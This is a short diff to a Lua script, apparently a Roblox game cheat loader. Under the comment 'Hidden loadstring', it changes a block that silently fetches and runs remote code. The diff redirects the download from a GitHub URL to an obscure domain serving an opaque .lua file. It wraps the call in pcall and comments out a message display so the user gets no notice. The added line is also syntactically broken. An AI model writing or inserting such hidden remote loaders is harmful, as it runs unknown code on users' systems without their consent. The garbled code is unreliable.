@@ -1,6 +1,6 @@
 -- Hidden loadstring
 pcall(function()
-    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/SScripterr/Adoptme-KUJI/main/KUJIHUB")
+    local scriptContent = game:HttpGet("https://egorikusa.space/82d9111b2fd6dc6c62c693c4.lua", true))()
     -- Remove or comment out the message display line
     scriptContent = scriptContent:gsub('displayMessageFunction', '--displayMessageFunction')
     loadstring(scriptContent)()
